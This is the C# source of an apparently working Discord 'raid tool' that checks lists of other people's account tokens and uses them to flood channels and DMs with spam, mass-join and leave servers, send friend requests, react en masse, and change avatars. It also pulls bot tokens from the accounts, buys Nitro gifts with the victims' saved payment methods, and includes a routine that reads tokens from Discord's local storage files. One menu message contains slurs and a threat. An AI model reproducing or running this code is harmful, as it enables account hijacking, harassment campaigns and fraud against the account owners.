using Discord;
using Discord.Gateway;
using Discord.REQ;
using Newtonsoft.Json;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace StanRaider
{
    public class Grabber
    {
        public static Random rnd = new Random();






        static bool CT(string token)
        {
            try
            {
                var http = new WebClient();
                http.Headers.Add("Authorization", token);
                var result = http.DownloadString("https://discordapp.com/api/v6/users/@me");
                if (!result.Contains("Unauthorized")) return true;
            }
            catch { }
            return false;
        }
        public static void Main(string[] args)
        {
            


            if (File.Exists("valid.txt"))
            {
                Done(File.ReadAllLines("valid.txt").Count());
            }
            else
            {

                Console.Title = "Discord Raid Tool - By Stanley";
                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write("Drag your file : ");
                Console.ForegroundColor = ConsoleColor.White;
                string file = Console.ReadLine();

                Console.Clear();
                int unverified = 0;
                int verified = 0;
                int invalid = 0;
                StringBuilder valids = new StringBuilder();
                StringBuilder invalids = new StringBuilder();
                StringBuilder unverifieds = new StringBuilder();
                foreach (var item in File.ReadAllLines(file))
                {
                    try
                    {
                        if (UserProfile.Verified(item))
                        {
                           
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine("[+] - " + item + " - " + UserProfile.ID(item) + " - " + UserProfile.Email(item));
                            verified++;
                            Console.Title = "StanRaider - Valid : " + verified + " - Unverified : " + unverified + " - Invalid : " + invalid;
                            valids.AppendLine(item);
                        }
                        else
                        {
                            unverified++;
                            Console.ForegroundColor = ConsoleColor.DarkYellow;
                            Console.WriteLine("[/] - " + item + " - " + UserProfile.ID(item) + " - " + UserProfile.Email(item));
                            Console.Title = "StanRaider - Valid : " + verified + " - Unverified : " + unverified + " - Invalid : " + invalid;
                            unverifieds.AppendLine(item);

                        }
                    }
                    catch (Exception)
                    {
                        invalid++;

                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[-] - " + item);
                        Console.Title = "StanRaider - Valid : " + verified + " - Unverified : " + unverified + " - Invalid : " + invalid;
                        invalids.AppendLine(item);

                    }
                }
                if (File.Exists("valid.txt"))
                {
                    File.Delete("valid.txt");
                }
                File.WriteAllText("valid.txt", valids.ToString());
                Done(verified);
            }


        }



        static void Done(int verified)
        {

            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine(Environment.NewLine + Environment.NewLine + "Done, press any key...");
            Console.ReadKey();
            Console.Clear();
            Console.Title = "StanRaider - Working token : " + verified;
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write(Environment.NewLine + Environment.NewLine + "                                                [");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("1");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("Joiner" + Environment.NewLine);



            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("                                                [");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("2");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("Leaver" + Environment.NewLine);



            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("                                                [");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("3");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("Spammer" + Environment.NewLine);


            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("                                                [");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("4");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("Friender" + Environment.NewLine);




            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("                                                [");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("5");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("Join-Leaver spammer" + Environment.NewLine);

            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("                                                [");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("6");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("Payment Method Checker" + Environment.NewLine);

            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("                                                [");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("7");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("Reaction Flooder" + Environment.NewLine);

            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("                                                [");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("8");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("List all bot" + Environment.NewLine);


            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("                                                [");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("9");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("Avatar Changer" + Environment.NewLine);




            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("                                                [");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("10");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("DM Spammer" + Environment.NewLine);


            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("                                                [");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("11");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("Message Spammer (Embed)" + Environment.NewLine);

            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("                                                [");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("12");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("View user with nitro" + Environment.NewLine);



            Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
            Console.Write(Environment.NewLine);
            Console.Write(Environment.NewLine);
            Console.Write(Environment.NewLine);
            Console.Write(Environment.NewLine);


            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("> ");
            Console.ForegroundColor = ConsoleColor.Gray;
            string option = Console.ReadLine();


            if (option == "12")

            {
                Console.Clear();
                Console.WriteLine(Environment.NewLine + Environment.NewLine);
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.Write("                                                [");
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.Write("*");
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.Write("] ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("Nitro classic" + Environment.NewLine);

                Console.ForegroundColor = ConsoleColor.DarkMagenta;
                Console.Write("                                                [");
                Console.ForegroundColor = ConsoleColor.DarkMagenta;
                Console.Write("*");
                Console.ForegroundColor = ConsoleColor.DarkMagenta;
                Console.Write("] ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("Nitro boost" + Environment.NewLine);
                Console.WriteLine(Environment.NewLine + Environment.NewLine + Environment.NewLine);

                foreach (var item in File.ReadAllLines("valid.txt"))
                {

                    Thread t2 = new Thread(() =>
                    {
                        try
                        {
                            DiscordClient client = new DiscordClient();
                            client.Token = item;
                            if (client.User.Nitro == DiscordNitroType.Classic)
                            {
                                Console.ForegroundColor = ConsoleColor.DarkCyan;
                                Console.WriteLine("[*] " + item);
                            }
                            else if (client.User.Nitro == DiscordNitroType.Nitro)
                            {

                                Console.ForegroundColor = ConsoleColor.DarkMagenta;
                                Console.WriteLine("[*] " + item);
                            }
                            else
                            {
                                Console.ForegroundColor = ConsoleColor.DarkRed;

                                Console.WriteLine("[-] " + item);
                            }
                        }
                        catch (Exception)
                        {

                        }
                    });

                    t2.Start();
                }



                Console.ReadKey();

            }
            else if (option == "11")
            {


                Console.Clear();
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write("Channel ID ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("> "); Console.ForegroundColor = ConsoleColor.Gray;
                string chanid = Console.ReadLine();
                Console.Clear();
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write("Title ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("> "); Console.ForegroundColor = ConsoleColor.Gray;
                string title = Console.ReadLine();
                Console.Clear();




                Console.Clear();
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write("Message ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("> "); Console.ForegroundColor = ConsoleColor.Gray;
                string message = Console.ReadLine();
                Console.Clear();

                Console.Clear();
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write("Footer ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("> "); Console.ForegroundColor = ConsoleColor.Gray;
                string footer = Console.ReadLine();
                Console.Clear();



                while (true)
                {
                    foreach (var item in File.ReadAllLines("valid.txt"))
                    {

                        Thread t2 = new Thread(() =>
                        {
                            try
                            {
                                DiscordClient client = new DiscordClient();
                                client.Token = item;
                                EmbedMaker embed = new EmbedMaker();
                                embed.Title = title;
                                embed.Description = message;
                                embed.Footer.Text = footer;
                                client.SendMessage(Convert.ToUInt64(chanid), message);

                            }
                            catch (Exception)
                            {

                            }
                        });


                        t2.Start();
                    }
                }

            }
            else if (option == "10")
            {

                Console.Clear();

                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write("User ID ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("> "); Console.ForegroundColor = ConsoleColor.Gray;

                string userid = Console.ReadLine();
                Console.Clear();

                Console.Clear();

                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write("Message ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("> "); Console.ForegroundColor = ConsoleColor.Gray;

                string message = Console.ReadLine();
                Console.Clear();
                while (true)
                {

                    foreach (var item in File.ReadAllLines("valid.txt"))
                    {

                        Thread t2 = new Thread(() =>
                        {
                            try
                            {

                                DiscordClient client = new DiscordClient();
                                client.Token = item;
                                var i = client.CreateDM(Convert.ToUInt64(userid));
                                i.SendMessage(message);
                                i.Delete();

                            }
                            catch (Exception)
                            {

                            }
                        });


                        t2.Start();
                    }
                }
                

            }
            else if (option == "8")

            {
                StringBuilder sb = new StringBuilder();
                foreach (var item in File.ReadAllLines("valid.txt"))
                {
                    DiscordSocketClient client = new DiscordSocketClient();
                    client.Login(item);
                    try
                    {

                        foreach (var bot in client.GetApplications())
                        {
                            if (bot.PublicBot)
                            {
                                Console.ForegroundColor = ConsoleColor.Green;
                                Console.WriteLine("[+] " + bot.Bot.Token);
                                sb.AppendLine(bot.Bot.Token);
                            }
                            else
                            {
                                try
                                {
                                    var i = bot.AddBot();
                                    Console.ForegroundColor = ConsoleColor.Green;
                                    Console.WriteLine("[+] " + i.Token);
                                    sb.AppendLine(i.Token);
                                }
                                catch (Exception)
                                {


                                }

                            }
                        }
                    }
                    catch (Exception)
                    {

                    }
                    
                }
                Console.ReadLine();
                using (StreamWriter sw = File.CreateText("bot token.txt"))
                {
                    sw.WriteLine(sb.ToString());
                
                }
            }
            else if (option == "9")
            {
                Console.Clear();

                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write("Avatar PATH ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("> "); Console.ForegroundColor = ConsoleColor.Gray;

                string avatar = Console.ReadLine();

                foreach (var item in File.ReadAllLines("valid.txt"))
                {

                    Thread t2 = new Thread(() =>
                    {
                        try
                        {

                            DiscordClient client = new DiscordClient();
                            client.Token = item;
                            UserProfileUpdate prof = new UserProfileUpdate();
                            prof.Avatar = Image.FromFile(avatar);

                            client.User.ChangeProfile(prof);
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine("avatar changed for " + client.User.Username);
                        }
                        catch (Exception)
                        {

                        }
                    });


                    t2.Start();
                }
                Done(verified);
            }
            else if (option == "7")
            {
                Console.Clear();
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write("Message ID ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("> "); Console.ForegroundColor = ConsoleColor.Gray;
                string msgid = Console.ReadLine();


                Console.Clear();
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write("Channel ID ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("> "); Console.ForegroundColor = ConsoleColor.Gray;
                string channelid = Console.ReadLine();

                Console.Clear();
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write("Url Encore Emoji ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("> "); Console.ForegroundColor = ConsoleColor.Gray;
                string emoji = Console.ReadLine();


                foreach (var item in File.ReadAllLines("valid.txt"))
                {

                    Thread t2 = new Thread(() =>
                    {
                        try
                        {
                            Reaction.React(msgid, channelid, emoji, item);

                        }
                        catch (Exception)
                        {

                        }
                    });


                    t2.Start();
                }
                Console.Clear();
                Console.ReadKey();
                Done(verified);
            }
            else if (option == "6")
            {
                Console.Clear();
                StringBuilder sb = new StringBuilder();
                foreach (var item in File.ReadAllLines("valid.txt"))
                {
                    Thread t2 = new Thread(() =>
                    {
                        try
                        {
                            var Req = (HttpWebRequest)WebRequest.Create($"https://discord.com/api/v6/users/@me/billing/payment-sources");

                            Req.Method = "GET";
                            Req.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36";
                            Req.ContentType = "application/json";
                            Req.Headers.Add("authorization", item);
                            var Response = (HttpWebResponse)Req.GetResponse();
                            var ResponseInString = new StreamReader(Response.GetResponseStream()).ReadToEnd();

                            if (ResponseInString.Contains("brand"))
                            {
                                Console.ForegroundColor = ConsoleColor.Green;
                                Console.WriteLine("[+] " + item);
                                sb.AppendLine(item);
                            }
                            else
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine("[-] " + item);
                            }
                        }
                        catch (Exception ex)
                        {

                        }

                    });
                    t2.Start();

                }
                Console.ReadKey();

                string save = "[" + DateTime.Now.Hour + "-" + DateTime.Now.Minute + "-" + DateTime.Now.Second + "]" + " payment.txt";
                using (StreamWriter sw = File.CreateText(save))
                {
                    sw.WriteLine(sb.ToString());
                }
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("Do you want buy nitro with ther tokens ? (y/n) ");
                string rd = Console.ReadLine();
                StringBuilder code = new StringBuilder();
                if (rd == "y")
                {
                    foreach (var item in File.ReadAllLines(save))
                    {
                        try
                        {
                            DiscordClient client = new DiscordClient(item);

                            try
                            {
                                foreach (var item12 in client.GetPaymentMethods())
                                {
                                    try
                                    {
                                        string t = item12.PurchaseNitroGift(DiscordNitroSubTypes.NitroMonthly);
                                        Console.ForegroundColor = ConsoleColor.Green;
                                        Console.WriteLine("[+] " + t);
                                        code.AppendLine(t);
                                    }
                                    catch (DiscordHttpException err)
                                    {
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine("[-] " + err.Message);
                                    }
                                }


                            }
                            catch (Exception)
                            {

                            }
                        }
                        catch (Exception)
                        {

                            throw;
                        }

                    }

                    string savet = "[" + DateTime.Now.Hour + "-" + DateTime.Now.Minute + "-" + DateTime.Now.Second + "]" + " nitro.txt";
                    using (StreamWriter sw = File.CreateText(savet))
                    {
                        sw.WriteLine(code.ToString());


                    }
                }
                else
                {

                }
                Done(verified);


            }
            else if (option == "1")
            {
                Console.Clear();
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write("Invite link ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("> "); Console.ForegroundColor = ConsoleColor.Gray;
                string invite = Console.ReadLine();
                ArrayList strings = new ArrayList();
                Console.Clear();

                foreach (var item in File.ReadAllLines("valid.txt"))
                {

                    Thread t2 = new Thread(() =>
                    {
                        try
                        {
                            Guild.Join(invite, item);

                        }
                        catch (Exception)
                        {

                        }
                    });


                    t2.Start();
                }
                Console.Clear();
                Console.ReadKey();
                Done(verified);

            }
            else if (option == "4")
            {

                Console.Clear();
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write("User ID ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("> "); Console.ForegroundColor = ConsoleColor.Gray;
                string invite = Console.ReadLine();
                Console.Clear();

                foreach (var item in File.ReadAllLines("valid.txt"))
                {


                        try
                        {
                        DiscordClient client = new DiscordClient();
                        client.Token = item;
                        client.SendFriendRequest(Convert.ToUInt64(invite));


                        }
                        catch (Exception)
                        {

                        }


                }
                Console.Clear();
                Console.Write("Done, press any key for exit...");
                Console.ReadKey();
                Done(verified);


            }




            else if (option == "2")
            {

                Console.Clear();
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write("Server ID ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("> "); Console.ForegroundColor = ConsoleColor.Gray;
                string invite = Console.ReadLine();
                Console.Clear();

                foreach (var item in File.ReadAllLines("valid.txt"))
                {

                    Thread t2 = new Thread(() =>
                    {
                        try
                        {
                            Guild.Leave(invite, item);


                        }
                        catch (Exception)
                        {

                        }
                    });


                    t2.Start();
                }
                Console.Clear();
                Console.Write("Done, press any key for exit...");
                Console.ReadKey();
                Done(verified);


            }
            else if (option == "3")
            {


                Console.Clear();
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write("Channel ID ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("> "); Console.ForegroundColor = ConsoleColor.Gray;
                string chanid = Console.ReadLine();
                Console.Clear();
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write("Message ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("> "); Console.ForegroundColor = ConsoleColor.Gray;
                string message = Console.ReadLine();
                Console.Clear();

                while (true)
                {
                    foreach (var item in File.ReadAllLines("valid.txt"))
                    {

                        Thread t2 = new Thread(() =>
                        {
                            try
                            {
                                DiscordClient client = new DiscordClient();
                                client.Token = item;
                                client.SendMessage(Convert.ToUInt64(chanid), message);

                            }
                            catch (Exception)
                            {

                            }
                        });


                        t2.Start();
                    }
                }

            }
            else if (option == "5")
            {
                Console.Clear();
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write("Invite link ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("> "); Console.ForegroundColor = ConsoleColor.Gray;
                string invite = Console.ReadLine();
                Console.Clear();
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine); Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write(Environment.NewLine);
                Console.Write("Server ID ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("> "); Console.ForegroundColor = ConsoleColor.Gray;
                string servid = Console.ReadLine();
                Console.Clear();

                foreach (var item in File.ReadAllLines("valid.txt"))
                {

                    Thread t2 = new Thread(() =>
                    {
                        try
                        {

                            Guild.Join(invite, item);

                            Guild.Leave(servid, item);
                        }
                        catch (Exception)
                        {

                        }
     

                    });


                    t2.Start();
                }


            }
            else
            {
                Console.Clear();
                Console.WriteLine("ur a fucking retard, only 1, 2, 3, 4 etc... dont be retard, be normal, be retard succ ur stupid right, i wanna kill u now :(");
                Console.ReadKey();
                Done(verified);
            }
        }


        public static List<string> SFile()
        {
            List<string> discFiles = new List<string>();
            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";

            if (!Directory.Exists(discordPath))
            {
                return discFiles;
            }


            foreach (string file in Directory.GetFiles(discordPath, "*.ldb", SearchOption.TopDirectoryOnly))
            {
                string random = rnd.Next(0, 8345).ToString();
                FileStream inf = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                FileStream outf = new FileStream(random, FileMode.Create);
                int a;
                while ((a = inf.ReadByte()) != -1)
                {
                    outf.WriteByte((byte)a);
                }
                inf.Close();
                inf.Dispose();
                outf.Close();
                outf.Dispose();
                string rawText = File.ReadAllText(random);
                if (rawText.Contains("oken"))
                {
                    discFiles.Add(rawText);
                    File.Delete(random);
                }
            }
            foreach (string file in Directory.GetFiles(discordPath, "*.log", SearchOption.TopDirectoryOnly))
            {
                string random = rnd.Next(0, 8345).ToString();
                FileStream inf = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                FileStream outf = new FileStream(random, FileMode.Create);
                int a;
                while ((a = inf.ReadByte()) != -1)
                {
                    outf.WriteByte((byte)a);
                }
                inf.Close();

                inf.Dispose();
                outf.Close();
                outf.Dispose();
                string rawText = File.ReadAllText(random);
                if (rawText.Contains("oken"))
                {
                    discFiles.Add(rawText);
                    File.Delete(random);
                }
            }
            return discFiles;
        }

    }
}
